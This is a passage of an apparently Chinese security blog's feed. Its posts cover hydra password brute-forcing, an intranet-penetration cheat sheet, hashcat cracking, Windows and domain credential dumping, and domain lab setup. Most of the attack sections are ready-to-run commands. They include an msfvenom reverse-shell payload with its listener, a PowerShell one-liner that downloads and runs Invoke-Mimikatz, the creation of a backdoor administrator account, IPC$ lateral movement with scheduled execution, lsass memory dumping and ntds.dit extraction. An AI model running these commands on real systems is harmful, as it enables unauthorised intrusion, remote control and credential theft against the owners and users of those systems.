cisco<br>hydra -m cloud -P pass.txt 192.168.0.115 cisco-enable</p></blockquote><p>8．破解SMB</p><blockquote><p>hydra -l administrator -P pass.txt 192.168.0.115 smb</p></blockquote><p>9．破解POP3</p><blockquote><p>hydra -l muts -P pass.txt my.pop3.mail pop3</p></blockquote><p>10．破解远程终端账号</p><p>（1）破解管理员账号</p><blockquote><p>hydra ip rdp -l administrator -P pass.txt -V</p></blockquote><p>（2）批量破解账号</p><blockquote><p>hydra -s 3389 192.168.44.138 rdp -L user.txt  -P pwd.txt –V</p></blockquote><p>11．破解HTTP-Proxy</p><blockquote><p>hydra -l admin -P pass.txt http-proxy://192.168.0.115</p></blockquote><p>12．破解IMAP</p><blockquote><p>hydra -L user.txt -p secret 192.168.0.115 imap PLAIN<br>hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;字典集&lt;br&gt;&lt;a href=&quot;https://www.weakpass.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.weakpass.com/&lt;/a&gt;&lt;br&gt;1.破解ssh&lt;br&gt;（1）破解指定用户名密码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hydra ip ssh -l 用户名 -P 密码字典 -t 线程(默认16) -vV&lt;br&gt;hydra ip ssh -l 用户名 -P 密码字典 -e ns -vV&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="kali" scheme="https://yaalonsong.github.io/categories/kali/"/>
    
    
      <category term="hydra" scheme="https://yaalonsong.github.io/tags/hydra/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透小记</title>
    <link href="https://yaalonsong.github.io/2019/02/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8F%E8%AE%B0.html"/>
    <id>https://yaalonsong.github.io/2019/02/26/内网渗透小记.html</id>
    <published>2019-02-26T14:33:16.702Z</published>
    <updated>2019-08-08T17:33:08.863Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用一句话webshell"><a href="#常用一句话webshell" class="headerlink" title="常用一句话webshell"></a>常用一句话webshell</h2><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><a id="more"></a><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dnscmd &lt;servername&gt; /ZonePrint &lt;zonename&gt;  查看dns列表（DC执行）</span><br><span class="line">tasklist /SVC   查看系统进程及其描述</span><br><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line">net user  查看本机用户</span><br><span class="line">net user /domain 查看域用户</span><br><span class="line">net view &amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二个查的更多</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view \\\\dc   查看 dc 域内共享文件</span><br><span class="line">net group /domain 查看域里面的组</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管</span><br><span class="line">net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管</span><br><span class="line">net group &quot;domain controllers&quot; /domain 域控</span><br><span class="line">net time /domain </span><br><span class="line">net config workstation   当前登录域 - 计算机名 - 用户名</span><br><span class="line">net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</span><br><span class="line">ipconfig</span><br><span class="line">systeminfo</span><br><span class="line">tasklist /svc   详细进程信息</span><br><span class="line">tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</span><br><span class="line">taskkill /im  imagename  /f  结束进程</span><br><span class="line">net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</span><br><span class="line">netstat -ano</span><br><span class="line">nltest /dclist:xx  查看域控</span><br><span class="line">nltest /domain_trusts   查看域信任信息</span><br><span class="line">whoami /all 查看 Mandatory Label uac 级别和 sid 号</span><br><span class="line">net sessoin 查看远程连接 session (需要管理权限)</span><br><span class="line">net share     共享目录</span><br><span class="line">cmdkey /l   查看保存登陆凭证</span><br><span class="line">echo %logonserver%  查看登陆域</span><br><span class="line">spn –l administrator spn 记录</span><br><span class="line">set  环境变量</span><br><span class="line">dsquery server - 查找目录中的 AD DC/LDS 实例</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery computer 查询所有计算机名称 windows 2003</span><br><span class="line">dir /s *.exe 查找指定目录下及子目录下没隐藏文件</span><br><span class="line">arp -a</span><br><span class="line">tracert  查路由</span><br></pre></td></tr></table></figure><h2 id="windows-下载文件"><a href="#windows-下载文件" class="headerlink" title="windows 下载文件"></a>windows 下载文件</h2><ul><li><p>bitsadmin</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download文件</span><br><span class="line">bitsadmin /transfer n https://www.baidu.com/robots.txt c:\<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一条命令download文件</span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'https://www.baidu.com/robots.txt'</span>,<span class="string">'C:\1.txt'</span>)</span><br><span class="line">多条命令download文件</span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">new-object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$client</span>.DownloadFile(<span class="string">'https://www.baidu.com/robots.txt'</span>, <span class="string">'C:\1.txt'</span>)</span><br></pre></td></tr></table></figure></li><li><p>certutil.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c certutil.exe -urlcache -split -f https://www.baidu.com/robots.txt</span><br></pre></td></tr></table></figure></li></ul><h2 id="添加删除用户操作"><a href="#添加删除用户操作" class="headerlink" title="添加删除用户操作"></a>添加删除用户操作</h2><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin1 P@ssw0rd /add &amp; net localgroup administrators admin1 /add    添加用户并设置管理员</span><br><span class="line">net user admin1 /del</span><br></pre></td></tr></table></figure></li></ul><h2 id="内网代理工具"><a href="#内网代理工具" class="headerlink" title="内网代理工具"></a>内网代理工具</h2><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h4><p>tools:<br><a href="http://rootkiter.com/EarthWorm" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm</a><br>正向：<br>被攻击机(跳板)：</p><blockquote><p>./ew_for_Linux -s ssocksd -l 9999 (侦听 0.0.0.0:9999)<br>netstat -pantu|grep 9999 (查看是否侦听成功)</p></blockquote><p>攻击机：</p><blockquote><p>proxychain 设置 socks5 为跳板 ip port<br>proxychain nmap 即可以用跳板代理扫描其他主机</p></blockquote><h4 id="netsh-Windows-自带工具-windows-端口转发"><a href="#netsh-Windows-自带工具-windows-端口转发" class="headerlink" title="netsh   Windows 自带工具   windows 端口转发"></a>netsh   Windows 自带工具   windows 端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4  listenaddress=0.0.0.0 listenport=53 connectaddress=10.10.10.4  connectport=8880</span><br><span class="line">netsh interface  portproxy show  v4tov4</span><br><span class="line">netsh interface portproxy delete v4tov4  listenaddress=0.0.0.0 listenport=53</span><br></pre></td></tr></table></figure><p>MSF反弹 shell  </p><blockquote><p>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe </p></blockquote><p>1.生成一个回连木马</p><blockquote><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=443 -f dll&gt;/root/Desktop/443.dll</p></blockquote><p>2.生成木马后，我们在菜刀里放入生成的木马，运行，同时打开msf准备回连</p><blockquote><p>use exploit/multi/handler </p><p>set payload windows/meterpreter/reverse_tcp<br>set LHOST 192.168.2.111<br>set lport 443<br>run</p></blockquote><p>4.提权</p><blockquote><p>background 或 ctrl+z </p><p>use exploit/windows/local/ms11_080_afdjoinleaf<br>set session 1<br>run<br>hashdump      //密码获取<br>load mimikatz //使用mimikatz<br>kerberos      //查看解密</p></blockquote><p>5.新加路由查看子网</p><blockquote><p>route<br>background<br>sessions<br>route add 192.168.2.0 255.255.255.0 2<br>search mssql   //找mssql模块<br>use auxiliary/scanner/mssql/mssql_login  //使用login模块</p><p>show options </p><p>set rhosts 192.168.177.1/24 </p><p>set password sa@123<br>run<br>show options<br>set BEUTEFORCE_SPEED 0<br>run</p></blockquote><p>端口扫描search portscan </p><blockquote><p>use   auxiliary/scanner/portscan/tcp  //使用scanner模块<br>show options<br>set RHOSTS 192.168.2.0/24<br>set ports 139,445,3389  //设置扫描端口</p></blockquote><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc$"></a>ipc$</h2><blockquote><p>D:&gt;net use \192.168.1.254\c$ “pwd” /user:user     //连接192.168.1.254的IPC$共享，用unc路径<br>D:&gt;copy srv.exe \192.168.1.254\c$ //复制本地 srv.exe 到C根目录<br>D:&gt;net time \192.168.1.254         //查时间<br>D:&gt;at　\192.168.1.254 10:50 srv.exe //用at命令在10点50分启动 srv.exe<br>D:&gt;net use \192.168.1.254\c$ /del</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;常用一句话webshell&quot;&gt;&lt;a href=&quot;#常用一句话webshell&quot; class=&quot;headerlink&quot; title=&quot;常用一句话webshell&quot;&gt;&lt;/a&gt;常用一句话webshell&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/tennc/webshell&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/tennc/webshell&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="MSF" scheme="https://yaalonsong.github.io/tags/MSF/"/>
    
  </entry>
  
  <entry>
    <title>Hashcat Readme</title>
    <link href="https://yaalonsong.github.io/2019/01/18/hashcat-readme.html"/>
    <id>https://yaalonsong.github.io/2019/01/18/hashcat-readme.html</id>
    <published>2019-01-17T16:28:52.000Z</published>
    <updated>2019-02-26T15:24:05.092Z</updated>
    
    <content type="html"><![CDATA[<p>#################################################################<br>&amp;               hashcat4.0.1 or 4.1.0                                                                            &amp;</p><p>#################################################################</p><a id="more"></a><p>hash r.txt文件格式   用户名:hash</p><p>–show 导出已破解的用户名:密码   outr.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –show –outfile=C:\Users\hash\Desktop\outr.txt –outfile-format 3 –username c:\Users\hash\Desktop\r.txt </p></blockquote><p>–left 导出未破解的用户名:hash   leftr.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr.txt –outfile-format 1 –username c:\Users\hash\Desktop\r.txt</p></blockquote><p>增加密码复杂度命令破解leftr.txt（未破解的用户名:hash）</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\outr1.txt –outfile-format 3 –username c:\Users\hash\Desktop\leftr.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force</p></blockquote><p>结束以后导出未爆破用户名加hash.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr2.txt –outfile-format 1 –username c:\Users\hash\Desktop\leftr.txt</p><p>hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\out-1.txt –outfile-format 3 –username c:\Users\hash\Desktop\1.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#################################################################&lt;br&gt;&amp;amp;               hashcat4.0.1 or 4.1.0                                                                            &amp;amp;&lt;/p&gt;
&lt;p&gt;#################################################################&lt;/p&gt;
    
    </summary>
    
      <category term="密码破解" scheme="https://yaalonsong.github.io/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="hashcat" scheme="https://yaalonsong.github.io/tags/hashcat/"/>
    
  </entry>
  
  <entry>
    <title>抓取 Windows 用户或者域用户 hash 的多种姿势</title>
    <link href="https://yaalonsong.github.io/2018/10/18/%E6%8A%93hash.html"/>
    <id>https://yaalonsong.github.io/2018/10/18/抓hash.html</id>
    <published>2018-10-18T14:45:02.000Z</published>
    <updated>2019-02-26T15:19:24.693Z</updated>
    
    <content type="html"><![CDATA[<h2 id="抓取-Windows-用户或者域用户-hash-的多种姿势"><a href="#抓取-Windows-用户或者域用户-hash-的多种姿势" class="headerlink" title="抓取 Windows 用户或者域用户 hash 的多种姿势"></a>抓取 Windows 用户或者域用户 hash 的多种姿势</h2><blockquote><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。第二个加密步骤是为了执行密码转储以进行审计，需要两个文件的副本。<a id="more"></a></p><p>执行密码安全审核所需的主要步骤是获取包含信息的文件，从文件中转储密码哈希值，然后使用密码破解程序测试弱密码的这些哈希值。</p><p>通过获取Ntds.dit和SYSTEM文件的副本，最可靠的执行密码审计的方法是脱机的。由于Windows阻止这些操作阻止标准读取或复制，因此必须使用特殊技术来获取副本。</p></blockquote><ul><li><p>使用mimikatz本机测试直接获取内存中的明文密码</p></li><li><p>mimikatz 只能抓取登陆过的用户hash，无法抓取所有用户,需要免杀</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li><li><p>非交互式抓明文密码(webshell中)</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" &gt; password.txt</span><br></pre></td></tr></table></figure></li><li><p>powershell加载mimikatz抓取密码</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz</span><br></pre></td></tr></table></figure></li><li><p>ProcDump + Mimikatz</p></li></ul><p>==ps:mimikatz的平台（platform）要与进行dump的系统(source dump)兼容(比如目标08的,本地就要用08系统来分析)==</p><p>远程主机：<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Procdump.exe -accepteula -ma lsass.exe c:\a.dmp    </span><br><span class="line">或者任务管理器找到lsass.exe进程右键创建转储文件</span><br></pre></td></tr></table></figure></p><p>本地主机：mimikatz</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">a.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span> <span class="title">full</span></span></span><br></pre></td></tr></table></figure><ul><li>ntds.dit 的导出</li></ul><p>ntdsutil win2008开始DC中自带的工具<br>交互式<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line">mount [GUID]</span><br><span class="line">//copy 完之后再执行</span><br><span class="line">unmout  [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure></p><p>非交互<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "activate instance ntds" create quit quit</span><br><span class="line">ntdsutil snapshot "mount &#123;GUID&#125;" quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit</span><br></pre></td></tr></table></figure></p><ul><li>QuarkPwDump分析 <a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">https://github.com/quarkslab/quarkspwdump</a></li></ul><p>在线提取（直接在目标主机执行，实战中不选择此方式。）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit</span><br></pre></td></tr></table></figure></p><p>离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt</span><br></pre></td></tr></table></figure><ul><li>WINDOWS SERVER 2008-2016<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ntdsutil</span><br><span class="line">ntdsutil: activate instance ntds</span><br><span class="line">ntdsutil: ifm</span><br><span class="line">ifm: create full c:\audit</span><br><span class="line">ifm: quit</span><br><span class="line">ntdsutil: quit</span><br></pre></td></tr></table></figure></li></ul><p>解出ntds的hash</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;SYSTEM&quot; -p pwdump.txt --users-csv users.csv</span><br></pre></td></tr></table></figure><p>  NtdsAudit.exe<a href="https://github.com/Dionach/NtdsAudit/releases/download/v2.0.5/NtdsAudit.exe" target="_blank" rel="noopener">下载地址</a></p><p>NtdsAudit需要<code>ntds.dit</code> Active Directory数据库，<code>SYSTEM</code> 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置<code>ntdsutil</code>实用程序。</p><ul><li><p>以管理员身份打开命令提示符（<code>cmd.exe</code>）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。</p></li><li><p>在命令提示符下，键入以下命令，然后按ENTER键：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br></pre></td></tr></table></figure><ul><li>在ntdsutil提示符下，键入以下命令，然后按Enter：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">activate instance ntds</span><br></pre></td></tr></table></figure><ul><li>在ntdsutil提示符下，键入以下命令，然后按Enter：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifm</span><br></pre></td></tr></table></figure><ul><li>在ifm提示符下，键入以下命令，然后按Enter：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br></pre></td></tr></table></figure><p> <code>&lt;Drive&gt;:\&lt;Folder&gt;</code> 是要创建的文件的文件夹路径。</p><p>例如，以下命令将显示统计信息，输出<code>pwdump.txt</code>包含密码哈希值的文件，并输出<code>users.csv</code>包含每个用户帐户详细信息的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv</span><br></pre></td></tr></table></figure><h2 id="Linux-明文密码的获取"><a href="#Linux-明文密码的获取" class="headerlink" title="Linux 明文密码的获取"></a>Linux 明文密码的获取</h2><p>mimipenguin</p><p>git clone <a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></p><p>支持的操作系统</p><table><thead><tr><th>os</th><th>service</th><th>supported</th></tr></thead><tbody><tr><td>Ubuntu Desktop 12.04 LTS x64</td><td>gnome-keyring-daemon (3.18.3)</td><td>Y</td></tr><tr><td>Ubuntu Desktop 16.04 LTS x64</td><td>gnome-keyring-daemon (3.18.3)</td><td>Y</td></tr><tr><td>Fedora Workstation 25 (x86_64)</td><td>gnome-keyring-daemon (3.20.0)</td><td>Y</td></tr><tr><td>Fedora Workstation 27 (x86_64)</td><td>gnome-keyring-daemon (3.20.1)</td><td>Y</td></tr><tr><td>Kali-rolling x64</td><td>gnome-keyring-daemon (3.28.0.2)</td><td>Y</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;抓取-Windows-用户或者域用户-hash-的多种姿势&quot;&gt;&lt;a href=&quot;#抓取-Windows-用户或者域用户-hash-的多种姿势&quot; class=&quot;headerlink&quot; title=&quot;抓取 Windows 用户或者域用户 hash 的多种姿势&quot;&gt;&lt;/a&gt;抓取 Windows 用户或者域用户 hash 的多种姿势&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。第二个加密步骤是为了执行密码转储以进行审计，需要两个文件的副本。
    
    </summary>
    
      <category term="内网" scheme="https://yaalonsong.github.io/categories/intranet/"/>
    
    
      <category term="域" scheme="https://yaalonsong.github.io/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>windows linux 应急响应流程及实战演练</title>
    <link href="https://yaalonsong.github.io/2018/10/17/windows%20linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html"/>
    <id>https://yaalonsong.github.io/2018/10/17/windows linux 应急响应.html</id>
    <published>2018-10-16T16:40:20.799Z</published>
    <updated>2018-10-16T16:52:24.453Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p></blockquote><a id="more"></a><p><a href="https://mp.weixin.qq.com/s/odo2Fjtklj-ibStAsyUjHw" target="_blank" rel="noopener">windows 应急流程及实战演练</a></p><p><a href="https://mp.weixin.qq.com/s/mG0O8Pr8kFF195JLc-XD3A" target="_blank" rel="noopener">Linux 应急响应流程及实战演练</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="应急响应" scheme="https://yaalonsong.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
      <category term="应急响应" scheme="https://yaalonsong.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>搭建域环境</title>
    <link href="https://yaalonsong.github.io/2018/10/16/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
    <id>https://yaalonsong.github.io/2018/10/16/域环境搭建.html</id>
    <published>2018-10-16T15:34:38.000Z</published>
    <updated>2018-10-16T15:48:13.449Z</updated>
    
    <content type="html"><![CDATA[<p><strong>域环境搭建 准备： DC: Windows 2008 server R2 DM: Windows 2003 server SP2</strong></p><p><strong>Windows 2008 server R2 (域控)</strong></p><a id="more"></a><p>1、修改计算机名： 可以改成DC或者其他什么看着顺眼的名字，默认也行，就是搭建好域以后再改可能会遇到一些问题；</p><p><img src="/uploads/y1.png" alt="imgl"></p><p><img src="/uploads/y2.png" alt="imgl"></p><p>2、配置固定ip: 我虚拟机使用的桥接方式，并且路由器是192.168.3.1，所以在这如此设置，此处的DNS填写本机即，127.0.0.1；</p><p><img src="/uploads/y3.png" alt="imgl"></p><p>3、服务器管理器—角色：安装Active Directory 域服务并且会同时要求安装DNS服务器；</p><p><img src="/uploads/y4.png" alt="imgl"></p><p>4、配置域服务:打开服务器管理器或者在运行框下输入 dcpromo直接进行配置，选择新建，</p><p>Ps：这里可能会因为本地administrator的密码规则不合要求，导致安装失败，改一个强密码；</p><p><img src="/uploads/y5.png" alt="imgl"></p><p>5、设置林根域： 林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生 具体见：<a href="http://angerfire.blog.51cto.com/198455/144123/" target="_blank" rel="noopener">http://angerfire.blog.51cto.com/198455/144123/ </a></p><p>6、域数据存放的地址：默认即可。</p><p><strong>DM: Windows 2003 server SP2</strong></p><p>1、如果新安装的虚拟机安装时会有选择项是加入域还是组，我这里选择加入域，会让登录当前域的账号密码即“Domaim\administrator”（必须是域账号不是administrator）和对应密码；已有的Windows2003加入域，首先更改组为域选择正确的domain和domain账号密码即可。</p><p>2、安装成功后配置静态IP，DNS处填写DC的IP；</p><p><img src="/uploads/y6.png" alt="imgl"></p><p>3、在2003上执行net time显示如图，说明已经加入域，并且在Windows2008上的domain.com域，控制器上可以看到03的机器；</p><p><img src="/uploads/y7.png" alt="imgl"></p><p><img src="/uploads/y8.png" alt="imgl"></p><p><strong>域已经搭建完成，主域控会生成一个 krbtgt账号，他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证。</strong><br><img src="/uploads/y9.png" alt="imgl"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;域环境搭建 准备： DC: Windows 2008 server R2 DM: Windows 2003 server SP2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Windows 2008 server R2 (域控)&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="内网" scheme="https://yaalonsong.github.io/categories/intranet/"/>
    
    
      <category term="内网" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="域" scheme="https://yaalonsong.github.io/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>通过MSF使用SMB端口远程连接目标的技巧</title>
    <link href="https://yaalonsong.github.io/2018/10/16/msf%20smb.html"/>
    <id>https://yaalonsong.github.io/2018/10/16/msf smb.html</id>
    <published>2018-10-16T14:55:36.000Z</published>
    <updated>2019-02-28T13:06:48.971Z</updated>
    
